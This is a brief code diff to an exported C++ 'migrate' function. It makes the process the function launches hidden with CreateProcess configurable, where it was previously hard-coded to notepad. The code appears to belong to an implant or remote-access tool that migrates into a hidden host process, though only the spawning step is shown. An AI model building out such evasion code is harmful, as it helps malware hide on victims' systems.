@@ -1,5 +1,6 @@
 #include "../common/crt.h"
 #include "../core/external.h"
+#include "../config.h"
 
 extern "C" __declspec(dllexport) void migrate(const char *arg)
 {
@@ -17,7 +18,7 @@ extern "C" __declspec(dllexport) void migrate(const char *arg)
         start_info.dwFlags = STARTF_USESHOWWINDOW;
         start_info.wShowWindow = SW_HIDE;
         
-        char cmd[] = "notepad";
+        char cmd[] = MIGPROC;
         
         CreateProcess(NULL,
                       cmd,
